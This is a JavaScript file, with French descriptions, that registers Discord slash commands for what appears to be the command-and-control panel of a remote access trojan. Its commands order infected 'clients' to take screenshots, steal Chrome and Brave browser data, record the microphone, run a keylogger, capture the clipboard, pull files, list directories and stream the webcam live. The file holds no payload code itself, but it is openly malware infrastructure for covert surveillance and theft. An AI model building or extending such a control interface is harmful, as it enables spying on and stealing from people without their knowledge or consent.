import {REST, Routes} from 'discord.js';
import config from './static/config.json' assert {type: 'json'};

const {TOKEN, CLIENT_ID, GUILD_ID} = config;

export const commands = [
    {
        name: 'help',
        description: 'Affiche la liste des commandes disponibles.',
    },
    {
        name: 'command',
        description: 'Envoie une commande à un client spécifique.',
        options: [
            {
                name: 'client_id',
                description: 'Le numéro du client.',
                type: 3,
                required: true,
            },
            {
                name: 'command',
                description: 'La commande à envoyer.',
                type: 3,
                required: true,
                choices: [
                    {
                        name: 'screenshot',
                        value: 'screenshot',
                    },
                    {
                        name: 'browserdata',
                        value: 'browserdata',
                    },
                    {
                        name: 'microphone',
                        value: 'microphone',
                    },
                    {
                        name: 'keylogger',
                        value: 'keylogger',
                    },
                    {
                        name: 'clipboard',
                        value: 'clipboard',
                    },
                    {
                        name: 'downloadfile',
                        value: 'downloadfile',
                    },
                    {
                        name: 'stop',
                        value: 'stop',
                    },
                ],
            },
            {
                name: 'duration',
                description: 'La durée de l\'enregistrement en secondes (uniquement pour le microphone). Par défaut, 10 secondes.',
                type: 4,
                required: false,
            },
            {
                name: 'file_path',
                description: 'Le chemin du fichier à télécharger (uniquement pour downloadfile).',
                type: 3,
                required: false,
            }
        ],
    },
    {
        name: 'live_stream',
        description: 'Diffuse en direct la webcam d\'un client.',
        options: [
            {
                name: 'client_id',
                description: 'Le numéro du client.',
                type: 3,
                required: true,
            },
        ],
    },
    {
        name: 'clients',
        description: 'Liste des clients.',
        options: [
            {
                name: 'status',
                description: 'Filtrer les clients par statut.',
                type: 3,
                required: false,
                choices: [
                    {
                        name: 'En ligne',
                        value: 'online',
                    },
                    {
                        name: 'Hors ligne',
                        value: 'offline',
                    },
                ],
            },
        ],
    },
    {
        name: 'list_data',
        description: 'Liste les données spécifiques pour un client.',
        options: [
            {
                name: 'type',
                description: 'Type de données à lister.',
                type: 3,
                required: true,
                choices: [
                    {name: 'Captures d\'écran', value: 'screenshot'},
                    {name: 'Enregistrements audio', value: 'microphone'},
                    {name: 'Données de navigation', value: 'browserdata'},
                    {name: 'Enregistrements du clavier', value: 'keylogger'},
                    {name: 'Récuperation presse papier', value: 'clipboard'},
                    {name: 'Fichiers téléchargés', value: 'downloadfile'}
                ],
            },
            {
                name: 'browser',
                description: 'Le navigateur à cibler (uniquement pour les données de navigation).',
                type: 3,
                required: false,
                choices: [
                    {name: 'Google Chrome', value: 'google-chrome'},
                    {name: 'Brave', value: 'brave'},
                ],
            },
        ],
    },
    {
        name: 'list_directories_client',
        description: 'Liste les répertoires pour un client spécifique.',
        options: [
            {
                name: 'client_id',
                description: 'Le numéro du client.',
                type: 3,
                required: true,
            },
            {
                name: 'dir_path',
                description: 'Le chemin du répertoire.',
                type: 3,
                required: true,
            },
        ],
    }
];

const rest = new REST({version: '10'}).setToken(TOKEN);

try {
    console.log('Début de la mise à jour des commandes de l\'application (/).');
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), {body: commands});

    console.log('Commandes de l\'application (/) mises à jour avec succès.');
} catch (error) {
    console.error(error);
}